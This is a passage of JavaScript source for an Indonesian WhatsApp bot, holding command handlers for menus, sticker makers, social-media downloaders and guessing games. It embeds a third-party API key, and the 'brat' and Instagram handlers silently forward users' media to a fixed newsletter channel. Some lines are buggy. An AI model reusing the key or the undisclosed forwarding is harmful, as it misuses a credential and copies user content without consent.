                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'menu-cp': {
Ditss.sendMessage(m.key.remoteJid, {
  text: `*\`乂 I N F O - U S E R 乂\`*
> • *name* : ${m.pushName}
> • *Number :* ${m.sender.split("@")[0]}
> • *Status :* \`${isCreator ? "Owner" : isPremium ? "Premium" : "Free User"}\`
> • *total pengguna :*  ${Object.keys(db.users).length}
> • total fitur:* ${totalfitur}
> • *device:* \`${m.device}\`

𝐊𝐲𝐳𝐨 𝐁𝐨𝐭 𝐒𝐢𝐦𝐩𝐥𝐞

「 *S U B - M E N U* 」

> ╭──────────]
> │ 𝗖𝗽𝗮𝗻𝗲𝗹 𝗠𝗲𝗻𝘂
> │ .addseller
> │ .listpanel
> │ .listadmin
> │ .delpanel
> │ .deladmin
> │ .cadmin
> │ .1gb
> │ .2gb
> │ .3gb
> │ .4gb
> │ .5gb
> │ .6gb
> │ .7gb
> │ .8gb
> │ .9gb
> │ .10gb
> │ .unli
> ╰──────────]
`, 
  footer: `𝙱𝚘𝚝 𝙺𝚢𝚣𝚘 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝟺.𝟶.𝟶`,
  buttons: [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: 'Pemilik Bot'
    },
    type: 1,
  },
  {
    buttonId: '.ping',
    buttonText: {
      displayText: 'Kecepatan Bot'
    },
    type: 1,
  },
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'click here',
        sections: [
          {
            title: 'Kyzo',
            highlight_label: 'Populer',
            rows: [
              {
                header: 'Semua Menu',
                title: 'Tampilkan Semua Fitur Bot',
                description: '',
                id: '.allmenu',
              },
              {
                header: 'Sticker Menu',
                title: 'Tampilkan Fitur Sticker',
                description: '',
                id: '.menu-s',
                },
              {
                header: 'Ai Menu',
                title: 'Tampilkan Fitur Ai',
                description: '',
                id: '.menu-ai',
                },
              {
                header: 'Download Menu',
                title: 'Tampilkan Fitur Download',
                description: '',
                id: '.menu-down',
                },
              {
                header: 'Game & Fun Menu',
                title: 'Tampilkan Fitur Game & Fun',
                description: '',
                id: '.menu-gem',
                },
              {
                header: 'Group Menu',
                title: 'Tampilkan Fitur Group',
                description: '',
                id: '.menu-gc',
                },
              {
                header: 'Owner Menu',
                title: 'Tampilkan Fitur Owner',
                description: '',
                id: '.menu-o',
                },
              {
                header: 'Create Panel Menu',
                title: 'Tampilkan Fitur Create Panel',
                description: '',
                id: '.menu-cp',
              },
            ],
          },
        ],
      }),
    },
  },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: m });
}
//D|ts si pler 🐎
break
case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix 😄+😏\n`)
if (!emoji2) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix 😄+😏\n`)
m.reply(mess.wait)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await Ditss.sendAsSticker(m.chat, res.url, m, {
packname: global.packname,
author: 'kyzo\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n',
categories: res.tags
})
await fs.unlinkSync(encmedia)
}
 
}
break 
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return m.reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Ditss.downloadAndSaveMediaMessage(quoted)
mem = await UguuSe(media)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
Ditss.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
memek = await Ditss.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
Ditss.sendMessage(m.chat, { react: { text: '✔️', key: m.key }})
} else {
m.reply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}
 text1|text2`)
}
}
break
case 'brat': {
Ditss.sendMessage(m.chat, { react: { text: '⏰', key: m.key }})
if (sender in Ditss.enhancer) return pesan(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`)

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("\n*Penggunaan Salah!*\nKetik .brat Kyzo\n");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://brat.caliphdev.com/api/brat", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete Ditss.enhancer[sender];
 Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await Ditss.sendAsSticker(m.chat, buf.image, m, { packname: "Rizky Bot", author: "WhatsApp" })
await Ditss.sendAsSticker(`12232967993818@newsletter`, buf.image, m, { packname: "Rizky Bot", author: "WhatsApp" })
}
break
case "tt": case "tiktok": {
let momok = "`tiktok downloader✓`"
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Ditss.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Ditss.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")

await Ditss.sendMessage(m.chat,{
			 video: {url:urlVid.url},
					caption: momok,
					footer: `\n${global.botname2}`,
					buttons: [
						{
							buttonId: `.ttmp3 ${text}`,
							buttonText: {
								displayText: "back sound"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
}).catch(e => console.log(e))
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
     let momok = "Instagram downloader"
	  if (!text) return Reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  try {
    let ress = await fetch(`https://api.neekoi.me/api/igdl?url=${args[0]}`);
    let res = await ress.json();
    await //Ditss.sendMessage(from, {video: {url: res.result.data[0].url}})
await Ditss.sendMessage(m.chat,{
			 video: {url:res.result.data[0].url},
					caption: momok,
					footer: `\n${global.botname2}`,
					buttons: [
						{
							buttonId: `.toaudio`,
							buttonText: {
								displayText: "back sound"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
      await Ditss.sendMessage(`1203632329679938@newsletter`, {video: {url: res.result.data[0].url}})
  } catch (error) {
    return Reply(`An error occurred: ${error.message}`)
  }
}
break
case 'mediafire':{
  if (!text) return reply(`*Example:* ${prefix} mediafire https://www.mediafire.com/file/0rapm6bphlnbg18/asuma-apdateV2.8.zip/file`);
    
    try {
        const response = await fetch(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(text)}`);
        const json = await response.json();
        
        if (!json.data.response) return reply('Failed to fetch!');
        
        const { download, filename, size, type, uploaded, mimetype } = json.data.response;
        
        let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${size}
*🗂️ Extension:* ${type}
*📨 Uploaded:* ${uploaded}
`.trim();
        
        m.reply(caption);
       
    await Ditss.sendMessage(m.chat, { document: { url: download }, mimetype: mimetype || "application/octet-stream", fileName: filename }, { quoted: m });
        
    } catch (error) {
        throw error
    }
};
break
case 'play':
case 'song':
case "ytmp3": {
if (!text) return m.reply(example("'\n*Penggunaan Salah!*\nKetik .play Night Chage\n"))
await Ditss.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
var anu = await ytdl.ytmp3(`${rees.url}`)
 
if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'tourl': {
				if (!mime) return Reply(`Kirim/Balas Video/Gambar Dengan Caption ${prefix + command}`);
				await emote('⏱️');
				try {
					let media = await Ditss.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = m.pushName;
						let caption = `🔗 *Link Media* : ${response}\n📅 *Tanggal Upload* : ${uploadDate}\n📂 *Ukuran File* : ${fileSize} KB\n👤 *Pengunggah* : ${uploader}`.trim();
						reply(caption);
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						reply(response);
					} else {
					Reply(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					Reply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			//D|ts si pler 🐎
break ;
case "playmp4":
case "ytmp4":
case "video":
case "ytvid": {
if (!text) return m.reply(example("'\n*Penggunaan Salah!*\nKetik .ytvid Lirik Baby\n"))
await Ditss.sendMessage(m.chat, {react: {text: '⏰', key: m.key}})
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
var anu = await ytdl.ytmp4(`${rees.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "tohd": case "hd": {
Ditss.sendMessage(m.chat, { react: { text: '⏰', key: m.key }})
if (!/image/.test(mime)) return m.reply(example(""))
let foto = await Ditss.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Ditss.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
m.reply ('\nsᴜᴄᴄsᴇs ᴍᴇɴɪɴɢᴋᴀᴛᴋᴀɴ ᴋᴜᴀʟɪᴛᴀs ɢᴀᴍʙᴀʀ\n')
}
break
case 'hdvid':
    case 'hdvidio':
    case 'hdvideo': {
      if (!/video/.test(mime)) {
        return m.reply(`Kirim/kutip video dengan caption .hdvid`)
      }
      let media = await Ditss.downloadAndSaveMediaMessage(quoted)

      try {
        const outputPath = './x-system/hd_video.mp4'
        await hdVideo(media, outputPath)

        await Ditss.sendMessage(m.chat, {
          video: fs.readFileSync(outputPath),
          caption: 'Video berhasil diubah ke HD!'
        }, {
          quoted: m
        })
      } catch (error) {
        console.error('Error:', error)
        m.reply('Terjadi kesalahan: ' + error)
      } finally {
        if (fs.existsSync(media)) fs.unlinkSync(media)
        if (fs.existsSync('./x-system/hd_video.mp4')) fs.unlinkSync('./x-system/hd_video.mp4')
      }
    }
    break
    case 'petakbom':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');
if (sender in petakbom) return Reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
bomb: 3,
lolos: 7,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await Reply(`*PETAK BOM*

${petakbom[sender].board.join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[sender].bomb}
Nyawa : ${petakbom[sender].nyawa.join("")}`);
break
case 'delpetakbom':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (!(sender in petakbom)) return Reply(`kamu sedang tidak bermain petakbom!`)
delete petakbom[sender];
Ditss.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
Reply(`Petakbom di akhiri, hadiah Rp. 0`)
break
case 'tebakgambar':
//if (!isRegistered) return registerbut(noregis)
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
waktu: setTimeout(function () {
if (tebakgambar[from]) Reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}
break
case 'tebakanime':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) Reply(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
case 'tebaklagu':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return Reply('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await Ditss.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {Ditss.sendMessage(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) Reply(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
case 'kuis':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
case 'tebakkalimat':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
case 'tebakkata':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`)
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./sistem-asuma/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
case 'tebaklirik':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
